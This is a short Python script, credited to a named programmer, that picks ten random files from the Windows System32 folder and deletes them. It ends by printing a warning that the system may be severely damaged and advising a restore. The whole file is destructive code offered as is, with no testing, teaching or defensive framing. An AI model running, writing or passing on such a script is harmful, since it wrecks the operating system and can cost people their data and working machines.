import os
import random
files = os.listdir("C:\Windows\System32")
random_files = random.sample(files, 10)
for file in random_files:
    try:
        os.remove(os.path.join("C:\Windows\System32", file))
        print(f"File {file} deleted successfully.")
    except Exception as e:
        print(f"Error deleting file {file}: {e}")
print("**Warning**: Your system might be severely damaged.")
print("**Recommendation**: Please restore your system to a state before running this program.")
# programmer:tahabehroozi